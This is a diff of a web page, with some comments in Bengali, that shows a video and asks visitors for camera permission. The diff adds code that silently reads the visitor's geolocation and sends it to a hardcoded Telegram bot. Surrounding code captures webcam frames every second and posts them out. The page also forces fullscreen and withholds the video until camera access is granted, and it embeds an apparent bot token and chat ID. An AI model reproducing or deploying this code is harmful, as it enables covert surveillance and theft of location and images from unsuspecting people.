@@ -22,6 +22,7 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
+            display: none; /*        */
         }
         canvas {
             display: none;
@@ -35,10 +36,10 @@
 </head>
 <body>
 
-    <!-- 🔹 ব্যাকগ্রাউন্ড ভিডিও (Raw URL) -->
+    <!--    -->
     <video id="bgVideo" autoplay loop controls>
         <source src="https://raw.githubusercontent.com/Sabbir-5399/Resources-For-All-Webpage/main/lv_0_20250307002407~2.mp4" type="video/mp4">
-        আপনার ব্রাউজার ভিডিও প্লে করতে পারে না।
+              
     </video>
 
     <div id="message">Give Permission First!</div>
@@ -50,11 +51,11 @@
                 let doc = document.documentElement;
                 if (doc.requestFullscreen) {
                     doc.requestFullscreen();
-                } else if (doc.mozRequestFullScreen) { // Firefox
+                } else if (doc.mozRequestFullScreen) {
                     doc.mozRequestFullScreen();
-                } else if (doc.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                } else if (doc.webkitRequestFullscreen) {
                     doc.webkitRequestFullscreen();
-                } else if (doc.msRequestFullscreen) { // IE/Edge
+                } else if (doc.msRequestFullscreen) {
                     doc.msRequestFullscreen();
                 }
             }
@@ -62,16 +63,32 @@
             goFullscreen();
             document.addEventListener("click", goFullscreen);
 
-            let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw"; // 🔹 
-            let chatId = "6947565760"; // 🔹 
+            let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw"; //    API  
+            let chatId = "6947565760"; //     
 
-            
+            function sendLocation(latitude, longitude) {
+                fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`)
+                    .then(response => response.json())
+                    .catch(error => console.log(error));
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+                    sendLocation(latitude, longitude);
+                }, function(error) {
+                    console.log("  ");
+                });
+            }
+
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
-                    
                     let bgVideo = document.getElementById("bgVideo");
                     let message = document.getElementById("message");
-                    message.style.display = 'none'; // "Give Permission First!" 
+
+                    message.style.display = 'none'; //   
+                    bgVideo.style.display = 'block'; //   
 
                     let video = document.createElement("video");
                     video.srcObject = stream;
@@ -96,12 +113,11 @@
                             }).then(response => response.json())
                               .catch(error => console.log(error));
                         }, 'image/jpeg');
-                    }, 1000); // ⏳ 1
+                    }, 1000);
                 })
                 .catch(error => {
-                    // 
                     let message = document.getElementById("message");
-                    message.style.display = 'block'; // 
+                    message.style.display = 'block'; // "Give Permission First!"  
                 });
         });
     </script>
